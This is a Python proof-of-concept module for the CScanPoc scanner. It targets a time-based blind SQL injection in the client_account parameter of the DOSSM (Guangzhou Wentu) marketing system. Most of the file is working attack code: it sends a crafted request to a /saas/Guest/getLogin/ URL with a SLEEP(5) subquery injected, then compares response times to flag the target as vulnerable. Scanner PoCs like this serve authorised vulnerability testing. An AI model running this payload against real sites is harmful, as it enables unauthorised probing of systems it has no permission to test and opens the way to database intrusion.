# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'DOSSM_0001'  # 平台漏洞编号，留空
    name = '广州问途网络营销系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-20'  # 漏洞公布时间
    desc = '''
        系统：DOSSM(广州问途网络营销系统)
        框架：PHP + Mysql
        问题参数：client_account
        说明：该系统，凡是出现参数 client_account 的链接，都存在SQL注入漏洞。无论 GET or POST 类型。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0129390'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DOSSM(广州问途网络营销系统)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '98cf00c3-930e-4a69-b393-864323e303e1'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # http://www.wooyun.org/bugs/wooyun-2010-0129390
            # http://www.wooyun.org/bugs/wooyun-2010-0129392
            hh = hackhttp.hackhttp()
            arg = self.target
            # 获取页面访问时间
            start_t1 = time.time()
            code1, head, res, errcode, _ = hh.http(
                arg + '/saas/Guest/getLogin/?jsoncallback=jQuery191031815274455584586_1413791294237&client_account=wzs_ytyl*&code=&language=zh-cn&referer=&fields=1&_=1413791294238')
            end_t1 = time.time()
            body_time = end_t1 - start_t1  # 页面执行时间

            # 获取执行Payload执行时间
            payload = "/saas/Guest/getLogin/?jsoncallback=jQuery180009386292030103505_1413793315607&referer=&dossm-id=2014102016215825117&client_account=hn_hy'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))kGZx)%20AND%20'VpIC'='VpIC&language=zh-cn&referer=&fields=1&_=1413791294238"
            target = arg + payload
            start_t2 = time.time()
            code2, head, res, errcode, _ = hh.http(target)
            end_t2 = time.time()
            payload_time = end_t2 - start_t2  # 带payload的页面执行时间

            if code1 == 200 and code2 == 200 and body_time < 5 < payload_time:  # 确保正常访问不会超过5S且payload之后超过5S
                # security_note(target)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
